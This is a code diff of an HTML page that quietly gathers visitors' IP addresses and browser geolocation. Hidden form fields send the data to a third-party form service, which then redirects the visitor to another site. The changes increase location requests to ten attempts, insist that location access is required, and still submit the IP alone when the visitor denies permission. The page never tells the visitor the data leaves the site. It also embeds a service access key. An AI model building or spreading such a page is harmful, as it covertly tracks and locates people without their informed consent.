@@ -22,14 +22,14 @@
 </head>
 <body>
     <h1>Location and IP Information</h1>
-    <p id="status-message">Gathering information...</p>
+    <p id="status-message">Please allow access to your location.</p>
 
     <form id="quoteForm" action="https://api.web3forms.com/submit" method="POST">
         <input type="hidden" name="access_key" value="dbf36f00-5696-49cb-abae-61ae931fbd57">
         <input type="hidden" id="latitude" name="latitude">
         <input type="hidden" id="longitude" name="longitude">
         <input type="hidden" id="ip_address" name="ip_address">
-        <input type="hidden" name="redirect" value="https://ve.app">
+        <input type="hidden" name="redirect" value="https://v.app">
         <button type="submit" id="submit-btn"></button>
     </form>
 
@@ -38,7 +38,7 @@
     <script>
         let ipAddress = '';
         let locationAttempts = 0;
-        const MAX_ATTEMPTS = 3;
+        const MAX_ATTEMPTS = 10;
 
         window.onload = function() {
             getIPAddress();
@@ -53,7 +53,7 @@
                     requestLocation();
                 })
                 .catch(() => {
-                    document.getElementById("status-message").textContent = "Failed to get IP. Please try again.";
+                    requestLocation();
                 });
         }
 
@@ -65,11 +65,12 @@
                     } else if (result.state === 'prompt') {
                         navigator.geolocation.getCurrentPosition(submitForm, handleError);
                     } else if (result.state === 'denied') {
-                        submitIPOnly();
+                        showLocationButton();
                     }
                 });
             } else {
-                submitIPOnly();
+                document.getElementById("status-message").textContent = "Geolocation is not supported by this browser.";
+                showLocationButton();
             }
         }
 
@@ -96,8 +97,13 @@
             if (locationAttempts < MAX_ATTEMPTS) {
                 setTimeout(requestLocation, 1000); // Try again after 1 second
             } else {
-                submitIPOnly();
+                showLocationButton();
             }
+        }
+
+        function showLocationButton() {
+            document.getElementById("status-message").textContent = "Location access is required. Please enable location and try again.";
+            document.getElementById("location-btn").style.display = "inline-block";
         }
 
         function submitIPOnly() {
@@ -113,6 +119,15 @@
             this.style.display = "none";
             document.getElementById("status-message").textContent = "Requesting location...";
             requestLocation();
+        });
+
+        // Add event listener for the "Cancel" option when requesting location
+        navigator.permissions.query({name:'geolocation'}).then(function(permissionStatus) {
+            permissionStatus.onchange = function() {
+                if (this.state === 'denied') {
+                    submitIPOnly();
+                }
+            }
         });
     </script>
 </body>
